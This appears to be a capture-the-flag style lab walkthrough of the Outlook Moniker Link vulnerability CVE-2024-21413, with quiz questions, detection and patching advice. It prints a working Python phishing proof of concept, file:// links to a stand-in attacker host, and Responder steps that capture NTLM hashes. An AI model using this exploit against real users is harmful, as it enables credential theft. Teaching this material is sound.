# Moniker Link

## Task 1: Introduction

On February 13th, 2024, Microsoft announced a Microsoft Outlook
RCE & credential leak vulnerability with the assigned CVE of
[CVE-2024-21413](https://www.cve.org/CVERecord?id=CVE-2024-21413) (Moniker Link).
Haifei Li of Check Point Research is credited with discovering the vulnerability.

The vulnerability bypasses Outlook's security mechanisms when handing a specific type of
hyperlink known as a Moniker Link. An attacker can abuse this by sending an email that
contains a malicious Moniker Link to a victim, resulting in Outlook sending the
user's NTLM credentials to the attacker once the hyperlink is clicked.

Details relating to the scoring of the vulnerability
have been provided in the table below:

|CVSS|Description|
|:-|:-|
|Publish date|February 13th, 2024|

|Impact|Remote Code Execution & Credential Leak|
|Severity|Critical|
|Attack Complexity|Low|
|Scoring|9.8|

The vulnerability is known to affect the following Office releases:

|Release|Version|
|:-|:-|
|Microsoft Office LTSC 2021|affected from 19.0.0|
|Microsoft 365 Apps for Enterprise|affected from 16.0.1|
|Microsoft Office 2019|affected from 16.0.1|
|Microsoft Office 2016|affected from 16.0.0 before 16.0.5435.1001|

### Learning Objectives

- How the vulnerability works
- Understand Outlook's "Protected View"
- Using the vulnerability to leak credentials from an Outlook client
- Detection and mitigation measures

### Starting the VM

Note that you will need both the AttackBox and the vulnerable machine attached to
this task. To deploy the attached VM, press the green Start Machine button below.

The machine should launch in a split-screen view. If it doesn't, you can press
the blue Show Split View button near the top-right of this page.
All of the room can be done in split view, but if you prefer
connecting to the machine via RDP, you can use the following credentials:

|||
|:-|:-|
|Username|tryhackme|
|Password|Kkh3gv439dnq!|

Deploy both the AttackBox and vulnerable machine in this task.
The machine will take about 5 minutes to launch, so for now, complete this
task and proceed to the rest of the room; we will come onto the machine later.

***Answer the questions below***

What "Severity" rating has the CVE been assigned?

***Correct answer: critical***

## Task 2: Moniker Link (CVE-2024-21413)

Outlook can render emails as HTML. You may notice this being used by your favourite
newsletters. Additionally, Outlook can parse hyperlinks such as HTTP and HTTPS.
However, it can also open URLs specifying applications known as
[Moniker Links](https://learn.microsoft.com/en-us/windows/win32/com/url-monikers).
Normally, Outlook will prompt a security warning when external applications are triggered.

![out-sec-note](outlook-security-notice.png)

This pop-up is a result of Outlook's "Protected View". Protected View opens emails
containing attachments, hyperlinks and similar content in read-only mode,
blocking things such as macros (especially from outside an organisation).

By using the `file://` Moniker Link in our hyperlink, we can instruct Outlook to attempt
to access a file, such as a file on a network share:

```html
<a href="file://ATTACKER_IP/test">Click me</a>
```

The SMB protocol is used, which involves using local credentials for authentication.
However, Outlook's "Protected View" catches and blocks this attempt.

```html
<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>
```

The vulnerability here exists by modifying our hyperlink to include the `!` special
character and some text in our Moniker Link which results in bypassing Outlook’s
Protected View. For example:

```html
<a href="file://ATTACKER_IP/test!exploit">Click me</a>.
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```

We, as attackers, can provide a Moniker Link of this nature for the attack.
Note the share does not need to exist on the remote device, as an authentication
attempt will be attempted regardless, leading to the victim's
Windows netNTLMv2 hash being sent to the attacker.

Remote Code Execution (RCE) is possible because Moniker Links uses the
Component Object Model (COM) on Windows. However, explaining this is currently
out of scope for this room, as there is no publicly
released proof of concept for achieving RCE via this specific CVE.

***Answer the questions below***

What Moniker Link type do we use in the hyperlink?

***Correct answer:***

What is the special character used to bypass Outlook's "Protected View"?

***Correct answer:***

## Task 3: Exploitation

For this attack, we will email our victim a Moniker Link similar to the one provided
in the previous task. The objective, as the attacker, is to craft an email to
the victim with a Moniker Link that bypasses Outlook's "Protected View",
where the victim’s client will attempt to load a file from our attacking machine,
resulting in the victim’s netNTLMv2 hash being captured.

But first, let’s run through a PoC I have created (which is also available on
[GitHub](https://github.com/CMNatic/CVE-2024-21413)).

```python
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

The PoC:

- Takes an attacker & victim email. Normally, you would need to use your own SMTP server
  (this has already been provided for you in this room)
- Requires the password to authenticate. For this room, the password for
  `attacker@monikerlink.thm` is attacker
- Contains the email content (html_content),
  which contains our Moniker Link as a HTML hyperlink
- Then, fill in the "subject", "from" and "to" fields in the email
- Finally, it sends the email to the mail server

Let’s use Responder to create an SMB listener on our attacking machine.
For the THM AttackBox, the interface will be `-I ens5`.
The interface name will differ if you are using your own device (i.e. Kali).
If you would like some homework, an Impacket server can also be used.

```bash
# Starting Responder on our AttackBox
root@attackbox:# responder -I ens5
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

```

Let's open the vulnerable machine by pressing the "CVE-2024-21413"
pane in the split-screen view.

![pane1](pane1.png)

Open Outlook by clicking the "Outlook" shortcut on the desktop.
When Outlook has opened, click "I don't want to sign in or create an account"
on the popup.

![sign-in](sign-in.png)

Dismiss the second popup by clicking on the "X" at the top right of the popup (you may
need to drag the window to the left a little, depending on your screen resolution).

![product-key](product-key.png)

When completed, you will see the Outlook interface.
For this room, the victim's mailbox has already been set up in Outlook for you.

![outlook3](outlook3.png)

Return to your AttackBox. We will copy and paste the PoC above onto the AttackBox.

![pane2](pane2.png)

For this, we will create a new file on the AttackBox. `nano exploit.py` and use the
slide-out tray in the split-screen view. Refer to the GIF below to see this in action.

![abcopypaste](abcopypaste.gif)

We will need to do some initial setup on Our AttackBox before running the Python script:

- Modify the Moniker Link (line #12) in our PoC to reflect the IP address of our AttackBox
- Replace the MAILSERVER placeholder on line #31 with MACHINE_IP

When done, we can run the exploit.
When prompted for the attacker's email password, enter "attacker".

```bash
# Running exploit.py
root@attackbox:# python3 exploit.py
Enter your attacker email password: attacker
```

The Python script will print "Email delivered" when the email has been sent.
If the script complains about authentication failure, ensure you have correctly
replaced the values in `exploit.py`.
Now, let's return to the vulnerable machine and check for the new email:

![outlook4](outlook4.png)

Click on the "Click me" hyperlink and return to our "Responder"
terminal session on the AttackBox:

![responder](responder.png)

Success! The victim's netNTLMv2 hash has been captured on our AttackBox.

***Answer the questions below***

What is the name of the application that we use on
the AttackBox to capture the user's hash?

***Correct answer:***

What type of hash is captured once the hyperlink in the email has been clicked?

***Correct answer: netNTLMv2***

## Task 4: Detection

### YARA

A [Yara rule](https://github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar)

## Task 5: Remediation

Microsoft has included patches to resolve this vulnerability in February’s
“patch Tuesday” release. You can see a list of KB articles by Office
[build](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413).
Updating Office through Windows Update or the
[Microsoft Update Catalog](https://www.catalog.update.microsoft.com/Home.aspx)
is strongly recommended.

Additionally, in the meantime, it is a timely reminder to practice general - safe - cyber security practices. For example, reminding users to:

- Do not click random links (especially from unsolicited emails)
- Preview links before clicking them
- Forward suspicious emails to the respective department responsible for cyber security

Since this vulnerability bypasses Outlook's Protected View, there is no way to
reconfigure Outlook to prevent this attack. Additionally, preventing the SMB
protocol entirely may do more harm than good, especially as it is essential
for accessing network shares. However, you may be able to
block this at the firewall level, depending on the organisation.

## Task 6: Conclusion

Congrats! That was fun. As we know, Outlook is an extremely popular email client.
The CVE is known to affect a large portion of the Office suite,
and given its extremely low attack complexity, it's quite a spicy one.

Remember, it is essential to update Outlook through Windows Update or the
Microsoft Update Catalog as soon as possible, as there is no way to prevent
Outlook's "Protected View" from being bypassed.

I hope you enjoyed the room!
